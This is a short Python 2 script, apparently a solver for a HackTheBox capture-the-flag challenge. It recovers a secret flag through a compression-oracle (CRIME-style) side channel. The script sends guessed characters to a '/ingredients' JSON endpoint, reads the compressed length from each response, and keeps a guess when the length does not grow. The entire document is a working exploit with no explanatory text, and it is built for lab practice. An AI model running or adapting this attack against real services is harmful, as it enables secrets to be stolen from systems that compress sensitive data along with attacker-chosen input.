import string
import requests
import sys
import json

'''
for i in range(0x20,0x7f,1):
	print chr(i),
'''

charmap = '!"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
#print charmap

host = sys.argv[1]
#flag = 'Secret: HTB{'
flag = 'Secret: HTB{C0mpr3s'
high_len='3c00'
last_len='3c00'

url = 'http://'+host+'/ingredients'
headers = {'content-type': 'application/json'}
obj = {'ingredients': flag}

compressed_size = ''

r = requests.post(url, data=json.dumps(obj), headers=headers)

if r.ok == 1:
	print 'HTTP response OK!'
	for i in range(18*2,18*2+2*2):
		compressed_size += r.content.encode('hex')[i]
	last_len = compressed_size
	high_len = compressed_size

while flag[-1] != '}':
	for char in charmap:
		compressed_size = ''
		obj = {'ingredients': flag+char}
		r = requests.post(url, data=json.dumps(obj), headers=headers)
		if r.ok == 1:
			print 'HTTP response OK!'
			for i in range(18*2,18*2+2*2):
				compressed_size += r.content.encode('hex')[i]
			if compressed_size < high_len:
				print 'Error!!'
				break
			if compressed_size == high_len:
				last_len = compressed_size
				flag += char
				print flag
		else:
			print 'Network Error!'
			exit(0)



